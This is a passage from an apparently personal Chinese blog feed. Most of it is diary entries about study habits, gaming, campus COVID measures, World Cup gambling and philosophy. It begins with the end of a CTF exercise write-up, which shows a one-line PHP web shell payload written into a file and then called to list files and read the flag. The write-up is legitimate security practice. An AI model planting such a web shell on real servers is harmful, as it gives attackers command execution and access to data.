<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=&lt;?php System($_GET[1]);?&gt;</span><br></pre></td></tr></table></figure>
<p>之后直接执行命令即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/hack.php?1=ls -alh &amp;&amp; cat flag.php</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>学会分析源码，才知道应该做什么。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.wolai.com/ctfhub/oKTHZCKnTRgZzifYg5twqZ">代码中preg</a><br><a href="https://blog.csdn.net/qq_46266956/article/details/124377403">CTFHUB find_it</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>夫天地者，万物之逆旅也</title>
    <url>/2022/11/08/Diary_1108/</url>
    <content><![CDATA[<p><img src="/images/violet--6.png" alt="violet"></p>
<span id="more"></span>

<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>夫天地者万物之逆旅也；光阴者百代之过客也。而浮生若梦，为欢几何？</p>
<h1 id="有一天"><a href="#有一天" class="headerlink" title="有一天"></a>有一天</h1><p>痛改流水账模式，记录全经过以后也不会在意，不如写点想写的。<br>学习进度太慢了！内心有点烦躁，希望能在本周完成SQL注入的学习。<br>接自来水来烧开水，水质真不行。我都有点想买水桶了，但问题是成本会增加。不知嘴上皮肤一直皲裂是否因水的缘故。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>灵活一点，有趣一点。足矣。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>也无风雨也无晴</title>
    <url>/2022/11/07/Diary_1107/</url>
    <content><![CDATA[<p><img src="/images/violet--7.png" alt="violet"></p>
<span id="more"></span>

<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>回首向来萧瑟处，归去。也无风雨也无晴。</p>
<h1 id="没啥感受的一天"><a href="#没啥感受的一天" class="headerlink" title="没啥感受的一天"></a>没啥感受的一天</h1><p>诗是开始写这篇日志的时候才想起的。挺不错，一语双关咯。既形容了今天的天气，也形容了今天的感受。</p>
<p>午餐时间身边一人向我倾诉一些关于友人与家庭的琐事，让我觉得人间之事真麻烦呀。我想我现在这样就够了。</p>
<p>晚上重温了下sql语句，毕竟以前学的都忘光了。书还没看完就睡了，实在困。睡了大概两三个小时，起来学了点sql注入，一天便这样结束了。</p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这次好像还是写了20分钟，还是太久，争取缩短到10分钟以内。以后只说关注的事。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>欲望占据的一周</title>
    <url>/2022/11/13/Diary_1113/</url>
    <content><![CDATA[<p><img src="/images/%E6%89%98%E5%B0%948.gif" alt="托尔"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好几天没写日记了，这一周实在是非常懈怠，虽然写这篇的时候已经很迟了，明早8点还得起床，但我还是要写，记录一下我的罪行！</p>
<h1 id="对自己感到愤怒"><a href="#对自己感到愤怒" class="headerlink" title="对自己感到愤怒"></a>对自己感到愤怒</h1><p>从周四开始，被周围某人诱惑买了文明6，于是开始玩，这一下子变得无法收拾，当天玩到4点过。随后的几天也是花费大量时间在上面。导致学习进度几乎停滞。<br>但这并不是责怪诱惑我的玩游戏的人，只不过是我自己要靠近诱惑，最终被诱惑罢了。<br>绝大多数人的意志力其实并不强，在知道王阳明不被欲望打动的方法就是远离欲望后，我也顿悟了。但这周还是破功了，真是功亏一篑啊。</p>
<p>话虽如此，其实文明6还是挺好玩的，虽然steam好评不到90%，但我蛮喜欢的。<br>周围有4人都买了这款游戏，但还是只有和专注玩游戏的人一起玩才好玩。有的人玩着玩着退了，有的人刚买就玩别的游戏，有的人忙着打电话。我和这些人玩得不到好的游戏体验，也让我挺不满的。不曾想，怂恿我买游戏的人，却没给我好的游戏体验。所以说，这样子真不可靠。不要在同一个地方跌倒两次，不要轻易被怂恿！<br>幸好周围有个人是专注玩游戏的，今天玩得很开心。倒也算是一桩幸事了。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>要专注学习了！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>多情应笑我</title>
    <url>/2022/11/14/Diary_1114/</url>
    <content><![CDATA[<p><img src="/images/%E5%87%9B&%E6%8A%9A%E5%AD%905.png" alt="凛和抚子"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>满足？懈怠？享受？堕落？</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>故国神游，多情应笑我，早生华发。</p>
<h1 id="完整而有力"><a href="#完整而有力" class="headerlink" title="完整而有力"></a>完整而有力</h1><p>今日的生活勉强算是充实，不过还没从上周的状态中恢复过来。也许正因如此，我才能如此果断地选择花费2小时看搖曳露营的电影。所谓塞翁失马焉知非福吧。<br>虽然我并不反感傲慢，但我认为真正的傲慢，是凌驾于一切之上，睥睨众生的狂气。而不是自大自以为足够了的浮躁情绪。<br>摇曳露营电影看完了，虽然一路上带着小心翼翼的感觉，什么有什么波动大的情节，但幸好，没有网友说的那样糟糕。<br>我的文笔水平十分落后啊，本想写些什么，却发现只得冒出点浑浊的自来水，完全没有让人想喝下去的动力嘛。还是参考一下信评动画吧。酝酿一下，想的和写的是两回事啊！<br>正如标题所写，我想过一种完整而有力的人生。所谓完整，即不要被碎片化的事物分散精力与时间，比如看一些无关紧要的视频，或是做一些毫无意义的事情，又或是毫无理由的拖延等等。所谓有力，如尼采的一句话所说：每一个不曾起舞的日子，都是对生命的辜负。每一天都要竭尽全力去度过，去参与，去燃烧自己的热情。不要害怕过度，即便过度了，这样的日子也是一天天在减少，珍惜吧！</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>尽快恢复学习的状态，不要一蹶不振，不要持续受到诱惑，还有很多事需要完成啊！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>聪明与智慧</title>
    <url>/2022/11/16/Diary_1116/</url>
    <content><![CDATA[<p><img src="/images/%E6%89%98%E5%B0%9416.png" alt="托尔"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>12332112333321</p>
<h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>大知闲闲，小知间间；大言炎炎，小言詹詹</p>
<h1 id="指尖须臾"><a href="#指尖须臾" class="headerlink" title="指尖须臾"></a>指尖须臾</h1><p>之前本想说点什么，到临睡前却不知说什么了。可如果当时有想法的时候就写，又会打断正在做的事。两难选择，一直如此。</p>
<p>聪明是先天的，智慧是后天的。聪明通常是运用于某些专门知识上的，智慧通常更加广泛，因而并不一定能给学习运用专门知识带来较大帮助。聪明与智慧并不是一个同义词，至少我这么想。有其中一种，并不代表能拥有另一种。<br>有趣的是，如果只能拥有其中一种，那么人会更倾向于哪一种呢？<br>就思考到这里吧，夜已弥漫。</p>
<p>今天帮朋友弄“今日校园”app的定位签到，花了我大半时间，也没弄出来。这玩意儿太难搞了。得亏我这边没弄呢。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>别忘了该做的事！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>花落知多少</title>
    <url>/2022/11/17/Diary_1117/</url>
    <content><![CDATA[<p><img src="/images/8.jpg" alt=" "></p>
<span id="more"></span>

<h1 id="一句诗"><a href="#一句诗" class="headerlink" title="一句诗"></a>一句诗</h1><p>The world has kissed my soul with its pain, asking for its return in songs.<br>世界以痛吻我，要我报之以歌。</p>
<h1 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h1><p>交易要以最少的信息，达成最大的目的。<br>不要觉得自己宽容大度，多出让一些没关系，好心有时会办坏事。<br>今日与人交易得到的教训。虽然没赚到钱，但让我学到了比钱更重要的东西。</p>
<h1 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h1><p>今天晚上看的动画《赛博朋克 边缘行者》，里面出现了黑客。<br>让我自己想成为黑客的心又微微颤动了，差点想大半夜的再学一会儿哈哈<br>回想起第一部看的动画里，出现黑客的，那还非《命运石之门》莫属。</p>
<h1 id="效率"><a href="#效率" class="headerlink" title="效率"></a>效率</h1><p>到22点的时候感觉蛮疲惫了，洗冷水脸也没什么效果，导致本来一小时内能完成的，花了两小时。<br>是不是运动一下比较好呢，下次试试吧。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>普通且自信</title>
    <url>/2022/11/18/Diary_1118/</url>
    <content><![CDATA[<p><img src="/images/%E7%8A%AC%E5%B1%B1%E8%91%B51.png" alt="犬山葵"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一天的学习还是挺充实的，平静的生活。</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>长风破浪会有时，直挂云帆济沧海。</p>
<h1 id="行路难"><a href="#行路难" class="headerlink" title="行路难"></a>行路难</h1><p>这样的日子，独自的世界。<br>是枯燥的吗？是斑斓的吗？让人多想的时候，就不禁觉得，热情会被拉扯而消散。<br>还是少想一些吧，多做事。<br>今天突然想到了一个短语，大概是最近几年流行的？ 普通且自信<br>其实原本都没怎么在意过这个词，是被某人用在我身上贬我的时候，才注意到的。<br>似乎在网络上被人作为贬义而广泛使用。但其实，我个人而言，还蛮喜欢这个短语的。<br>说起来，什么是普通呢？<br>我想，当某人拥有某一方面的长处时，或许有人会认为他不普通。但这其实只是就这方面而言，其他不是长处的方面，不也很普通吗？<br>如果说，崭露头角的人是不普通的，那么衡量标准就成为了一个人在这世界上的名气，那岂不是“不普通”&#x3D;“名气大”吗？我也并不这么认为。<br>浅浅的思考了之后，给出一个暂时的答案吧。<br>我心中的不普通的人，一种是有智慧wisdom的人，另一种是在某一方面处于超脱常人（在整个世界上来衡量）的人。这后一种的不普通，就不一定是好的形容了。<br>自信，我认为在认为时候都不应当是贬义词，与自信相对的贬义词并不是没有：过度自信是自负，没有自信是自卑。</p>
<p>普通且自信，这个标签，也许还不错？<br>即便有人用这个词来贬我，我恐怕也只会报之一笑吧。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>每次碍于时间，想写什么，都不敢写深入，抽个时间，写点深刻的文字吧。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>平水远矣</title>
    <url>/2022/11/19/Diary_1119/</url>
    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_4.png" alt="凉宫春日&amp;长门有希"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>糟糕的一天</p>
<h1 id="兜兜转转"><a href="#兜兜转转" class="headerlink" title="兜兜转转"></a>兜兜转转</h1><p>今天一天什么都没玩，但我感觉非常地不好，没学到多少东西。就像绕着一个圈子一直在兜兜转转，没啥好说的，明早早起。<br>今天是World Cup(世界杯)开幕式来着，我倒是没什么兴趣，就这样吧。</p>
<h1 id="平水远矣"><a href="#平水远矣" class="headerlink" title="平水远矣"></a>平水远矣</h1><p>人生就像一碗盛满的水，唯有把水端平，才走得远。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>赶紧早点睡咯</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>我对普通人类没有兴趣</title>
    <url>/2022/11/21/Diary_1121/</url>
    <content><![CDATA[<p><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B4.png" alt="志摩凛"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>晚上学习的时候一个东西始终搞不通，烦死人了。</p>
<h1 id="一段文言文"><a href="#一段文言文" class="headerlink" title="一段文言文"></a>一段文言文</h1><p>夫子之道至大，故天下莫能容。虽然，夫子推而行之，不容何病，不容然后见君子！夫道之不修也，是吾丑也。夫道既已大修而不用，是有国者之丑也。不容何病，不容然后见君子！<br>--节选自《史记 孔子世家》</p>
<h1 id="不容然后见君子"><a href="#不容然后见君子" class="headerlink" title="不容然后见君子"></a>不容然后见君子</h1><p>上面那段文言文，最喜欢的就是我写在标题上这句话。有一种豪气或是傲慢在里面：你天下容不下我的理念，这是你天下的度量不够大，这不是我的过错。容不下又如何呢？就是因为容不下，才显得我是君子！<br>这是孔子提问时，颜回对孔子的回答。不愧是孔子最得意的门生呀。我想，做人能做到这种程度，就已然足够了。</p>
<h1 id="永恒"><a href="#永恒" class="headerlink" title="永恒"></a>永恒</h1><p>在最光辉灿烂的时候把生命一下子玩到尽头，就是永恒！  --黄家驹<br>来吧，用尽力气，去燃烧生命吧！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>出淤泥</title>
    <url>/2022/11/23/Diary_1123/</url>
    <content><![CDATA[<p><img src="/images/kaneki_3.png" alt="金木研"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>World Cup(世界杯)很火，以前都没怎么关注，但是因为各方面因素吧，让我这种从不关注世界杯的人都开始了。当然是被迫的，实在太吵了周围人，让我不得不。<br>然而，虽然很火，其实重头还是在赌球上，并不在足球本身，想想也挺无聊。</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>既见君子，云胡不喜</p>
<h1 id="欲望的故事"><a href="#欲望的故事" class="headerlink" title="欲望的故事"></a>欲望的故事</h1><p>王阳明上学的路上要经过一条街，一天，街上忽然多了一家赌博的小馆子，里面每天都挤满了人。跟王阳明一起上学的同伴们有时也会好奇地站在门口往里面看。王守仁提醒大家离赌场远点，大家都不当回事：就看看，不进去，有啥？<br>看看劝阻无效，王阳明就跟小伙伴儿建议：咱们换条路走吧。小伙伴儿很不解：“他赌他的，咱走咱的，互不相干，有啥关系？你这胆子也太小了。”<br>王阳明答：“我怕看多了，也会产生欲望，挡不住诱惑。”<br>小伙伴们哈哈大笑：“看几眼就受不了，那意志也太不坚定了。咱们这么志怀高远的不会的，放心好了。”<br>小伙伴们坚持走原路，只有王阳明一个人每天绕道去私塾，不再从那条街过。<br>一个多月后，有位同学接连几天都没来上课。原来他前段时间迷上了赌博，开始只是拿一点小钱来玩，后来越玩越大，偷了家里的玉器，父母得知后非常生气，把他关在家中反省。<br>王守仁后来讲这个故事给人听，并总结说：“想要避免欲望，最好的办法就是远离，甚至不要多看一眼。这不是胆子小，而是从根源上隔绝欲望。”</p>
<h1 id="我的看法"><a href="#我的看法" class="headerlink" title="我的看法"></a>我的看法</h1><p>很多年前看到这个故事，是在一本杂志的卷首。说实话，这给了我非常大的触动。在这之前，我一直认为，抵挡不住诱惑是因为自身的意志力不够，所以才会被欲望牵着鼻子走。可看了这样一个如此优秀的人都没有对自己自制力感到自信，我也释然了。<br>像这样有智慧的人，即便是在他小时候，已经能明悟这种很多人不明白的道理，也远超大多成年人了。</p>
<h1 id="世界杯"><a href="#世界杯" class="headerlink" title="世界杯"></a>世界杯</h1><p>如果世界杯的火爆只是因为赌球，那只能是一种悲哀。因为赌球无非是贪欲和浮躁的混杂，既无技术又无规律，毫无看点可言。<br>虽然我对世界杯没有兴趣，却也不愿看到这种光景。<br>然而，其实我们也可以反思当下环境中赌球之心如此热烈的原因。主要原因就是经济衰退，赚钱困难。也可谓人之常情吧。<br>最近周围很多人都在谈论赌球，甚至参与赌球。但我绝不参与，无论周围人之后翻了多少倍我也不会眼红。原因，已经在上面故事里讲得很清楚了。只是即便如此也会被影响，还是略有不适吧。<br>好笑的是，原本周围两个冷战关系不好的人，却因为世界杯赌球聊起来了。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我现在就像是在淤泥中，愿我能不染。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>是非成败转头空</title>
    <url>/2022/11/24/Diary_1124/</url>
    <content><![CDATA[<p><img src="/images/%E9%9D%A2%E7%A0%81122.jpg" alt="本间芽衣子"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不知不觉过去了一天…</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>You smiled and talked to me of nothing and I felt that for this I had been waiting long.<br>你微笑地看着我，不说一句话。而我知道，为了这个，我已经等待很久了。</p>
<h1 id="时间的认知"><a href="#时间的认知" class="headerlink" title="时间的认知"></a>时间的认知</h1><p>零点过的时候，骤然看了下日期，发现周五，以为明日是周末了。一种快乐从我心底迸发，是惊讶的喜悦。可我过了会儿发现，日期是零点过后看的，周五才刚刚开始。我就像走入了周五的循环，第一次认识的时候，它是<strong>末尾</strong>。第二次认识的时候，它是<strong>开始</strong>。下一次认识，恐怕又是<strong>末尾</strong>了吧。<br>好像有什么变了，好像什么都没变。变的是我的认知，不变的是世界的规律。</p>
<h1 id="一天"><a href="#一天" class="headerlink" title="一天"></a>一天</h1><p>突然想到了穆勒的《功利主义》，好久没读了。这里提醒自己一下，有时间去读。这本书的一些重要思想：</p>
<ul>
<li>高级快乐和低级快乐，快乐有质的不同</li>
<li>调和美德与幸福的冲突，美德也是一种幸福</li>
<li>正义需要感性的力量，有别于利益</li>
</ul>
<p>早上本可吃早餐然后完成“检测”，但我不知道哪根筋抽了，居然在等无谓的人，浪费了足足半小时有余，甚至因此在十一点前就吃了午餐，实在糟糕。然而，因等了人，才知道有另外的渠道查看“码”。让我不禁想到了一句话：一个人能走得更快，一群人能走得更远。<br>所以，我的选择是御风而行，不浪费生命。<br>晚上听听力真糟糕，吵闹混乱使人效率变得低下，早点起听听力，学英语！</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不敢相信，这篇短短日记写了半小时，又睡晚了可恶啊！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>宁为玉碎</title>
    <url>/2022/11/25/Diary_1125/</url>
    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5.png" alt="凉宫春日"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我的生活一如既往，平淡且平静。不过今天似乎在乌鲁木齐没有那么安宁，然而我也做不了什么。逝者愿安息，生者愿平安。</p>
<h1 id="点滴"><a href="#点滴" class="headerlink" title="点滴"></a>点滴</h1><p>今天的学习状态还是比较满意的，只是学习时长不够长。今日杂务做完了，明天多学习，尤其English!<br>学到了一个小知识：喝水温度对65℃以上对口腔不好。感受到烫一般是50℃以上。<br>昨晚又晚睡了，这不好，再次提醒自己要早睡。早起吃早餐听听力。</p>
<h1 id="激进分子"><a href="#激进分子" class="headerlink" title="激进分子"></a>激进分子</h1><p>No progress without radicals.没有激进分子就没有进步。<br>这是我今天听听力，听到的一句话。其实没预料到，听听力也能听出一些深刻的话。遇到了一篇蛮有趣的文章。<br>想想其实的确如此，很多事物的改变就是来源于“激进分子”。当然，这个激进分子是广义上的。<br>比如乔布斯，在各个手机厂商都流行在手机上加更多的键时，他一意孤行选择了只给手机保留一个键，这何尝不是一种激进呢？<br>还有很多例子，都可以说明，激进并不一定是一件坏事。<br>社会的大多数人，都是倾向于稳定的。因此激进很容易被反对，也不会被大多数人所理解。这也意味着，激进分子是少数人的“特权”。<br>具前瞻性的言论未必会为时人所接受。但当时间证明了该言论的价值时，社会各界又会争相附和。<br>这就和之前的“不容，然后见君子”其实是联系到一起了。<br>本质上表达的思想是相同的。<br>当然，激进并非代表愚昧的激进，而是明智的激进才是有益的。愚蠢的激进只是滑稽的表演。<br>最后，未来想要更激进一点，如果有人用radical来形容我，我想我会把这个词当作称赞的。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>再借我一点时间吧，我会更珍惜的。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>年末月初</title>
    <url>/2022/12/01/Diary_1201/</url>
    <content><![CDATA[<p><img src="/images/12.jpg" alt="彼岸花"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这几天发生了许多事，我却觉得有一种新鲜感。</p>
<h1 id="降临"><a href="#降临" class="headerlink" title="降临"></a>降临</h1><p>本来周围一直没有什么阳性，从疫情出现以来。<br>不过嘛，根据墨菲定律，也是该发生一回了。<br>我一直没有经历过，网传很多也遥远得像另一星球发生的故事让我不知该作何反应。<br>于是这一天终于到来了，昨天本来要打算出门了，但周围人口耳相传的消息总算是敲了敲我的外壳，似乎是告诉我“今天的报纸送到了哦。”<br>我自然也如老大爷般喝着茶波澜不惊地看着报纸，仿佛一切都是国际新闻--与我无关。<br>直到发现另一寝室的人跑去抢购食品了我才意识到，情况似乎有点严重？尽管如此，过了一会儿还是悠哉游哉地去食堂吃晚餐了。<br>周围一人欲出校门未果，遂转来投奔于我。饭饱之后兴致大发，逛一逛许久没走过的“河山”。探到通往外面的幽径，便心满意足地回去了。<br>最终也没有如猜测中封寝，大概是防疫管控的松口还是有那么一些效果，变得稍微有了个人样。<br>这便是昨天的故事。<br>今日未到该到的地点，早上的腾讯会议只是伴我继续睡觉。又有新阳性的出现为这个小小的地方平添了恐慌等的负面情绪。接下来，又会如何呢？</p>
<h1 id="信任"><a href="#信任" class="headerlink" title="信任"></a>信任</h1><p>在这个事上，上面的人对下面的人以及网络都在隐瞒。恐怕是害怕事情闹大，管控不住舆论，最终导致自己承担罪责，担当替罪羊，丢掉乌纱帽。这便是常态，或许任何一个人都会感到这件事上的荒谬，经历得多了却容易让人麻木。或许很多人都会感到恐慌气愤不解吧，可是我没什么感觉，为许许多多事愤怒过，最终平息了。即便是盛大的火山，也终有喷发完之时。这是自然规律，人也遵循人性规律。可唯有打破这种人性，才能突破桎梏，做一个痛苦的“人”。<br>产生的这些负面情绪，得不到发泄的地方，最终会造成一件事，信任缺失。上面的人从一开始就没有信任下面的人，对下面的人公布真实情况。这也必然造成下面的人无法信任上面的人。互相之间信任度越来越低，倘若得不到缓解终有一天会物极必反。首先从管理配合上会让校方付出更多成本代价，其次矛盾冲突也会慢慢上升，双方之间的隔阂也会逐渐加剧。往后会如何我并不可知，也不屑于知道。<br>悲哀的是，掌握大权却没有下面的人的制约，几乎没有什么办法改善。这些人能如何呢？以头抢地耳！<br>很明显，在这个囚徒困境中，上面的人是最先背叛的那一方。那么自然也是问题最大的一方。<br>就这样吧，2点过了。</p>
<h1 id="灵感"><a href="#灵感" class="headerlink" title="灵感"></a>灵感</h1><p>有时候写点东西，有灵感，便如洪水般涌出。没有灵感的时候，想挤点啥都困难呢。而我写了这么多日记，今天是第一次感觉自己有点灵感。碍于时间也只能匆匆结束。<br>曾想象自己是一个作家，也许每天都在挤榨自己脑海里的一点油墨吧。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我想看书的啊，又到这个时候了，烦诶。<br>明天一定要看叔本华的 <strong>作为意志和表象的世界</strong>！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>不知老之将至</title>
    <url>/2022/12/10/Diary_1202/</url>
    <content><![CDATA[<p><img src="/images/%E8%99%B9%E5%A4%8F_1.png" alt="虹夏"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好多天没写了，主要是因为懒吧。今天也很迟了，还是要写，不能一直松懈下去。</p>
<h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>发愤忘食，乐以忘忧，不知老之将至云尔。<br>--孔子</p>
<h1 id="孔子的英文"><a href="#孔子的英文" class="headerlink" title="孔子的英文"></a>孔子的英文</h1><p>近来看到孔子的一句英文，但我实在想不起对应的中文原文是什么了，按理说应该有名啊，这里暂且写一下英文：<br>Our greatest glory is not in never falling, but in rising every time we fall.<br>以后有意再找找吧。</p>
<h1 id="记录近况"><a href="#记录近况" class="headerlink" title="记录近况"></a>记录近况</h1><p>约莫有十天没写了吧，从我因为住的楼里出现新冠阳性，到我从小道溜出去住亲戚家，再到人走的差不多，最后房里唯我一人。<br>大致上就是如此吧，流水账不必多言。</p>
<h1 id="学习方面"><a href="#学习方面" class="headerlink" title="学习方面"></a>学习方面</h1><p>需要用更多精力去看web安全方面的内容。<br>不过学得太浅了，怎么说呢？看视频和博客，再自己写博客。也没怎么练习，很多东西一知半解，让我觉得轻飘飘的，看似把知识学进脑中，实则什么也不会。这种感觉很不好受。<br>还是需要，看视频，毕竟这样印象要深一些，而且必须要多进行实际练习，比如ctf，漏洞复现之类的。我将把大部分精力都放在实际练习上，知识的东西如果不会有效运用，终究是无趣的教条。<br>一个人住在房子里，感觉自己就像在闭关修炼，其实感觉还不错？</p>
<h1 id="幸福的联系"><a href="#幸福的联系" class="headerlink" title="幸福的联系"></a>幸福的联系</h1><p>今天有人向我寻求问题的解答，大致是关于恋爱的事。<br>说着说着就谈到了幸福的问题。那人认为，幸福是每个人自己的，也即每个人的幸福是分开的，并不具有很强的联系。如果自己的幸福最大化，常常也会减损他人的幸福，也即是一种互斥的关系。<br>可在我看来，只有自己幸福最大化，才能让身边的人幸福。越是亲近的人，越会因我的幸福而变得幸福。也就是说，每个人的幸福之间具有很强的联系。倘若让他人伴我共赴地狱能使我幸福，那我会毫不犹豫邀请。因为我的幸福，即为我亲近之人的幸福。<br>常见的例子还有父母与孩子之间，孩子的幸福是父母的幸福。<br>但这个问题也是一个复杂的问题，比如身边的人关系亲疏是到什么程度，才会符合自己的幸福会给他人带来幸福？还有是些什么样的情形才符合？很多方面仍需思考，还不成熟。慢慢思考，以后专门写一篇文章吧。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我们都在等待，等待着别人来拯救我们自己。 --列夫·托尔斯泰</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>走走停停</title>
    <url>/2022/12/16/Diary_1216/</url>
    <content><![CDATA[<p><img src="/images/%E6%B3%A2%E5%A5%87_4.png" alt="波奇"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近写日志的频率有点低呢，是不是三分钟热度到期了啊~</p>
<h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>而世之奇伟、瑰怪，非常之观，常在于险远，而人之所罕至焉，故非有志者不能至也。有志矣，不随以止也，然力不足者，亦不能至也。有志与力，而又不随以怠，至于幽暗昏惑而无物以相之，亦不能至也。<br>--游褒禅山记</p>
<h1 id="关于隐私"><a href="#关于隐私" class="headerlink" title="关于隐私"></a>关于隐私</h1><p>最近意识到自己隐私的问题欸。可能有感而发，不小心说些现实中的话，尽管只是个小小博客，有心人也能搜集到许多信息吧。<br>由是如此，我想自己要少说些现实中的话，如果实在想说就说得抽象些，懂得人自然明白。还有就是尽量多写自己思考的东西，少写些日常。想想初中时写了一整年日记，当初以为自己会怀念往昔，有些事情写得十分详实，如今也不再看。<br>或许等我再老些时才会厚古薄今吧…</p>
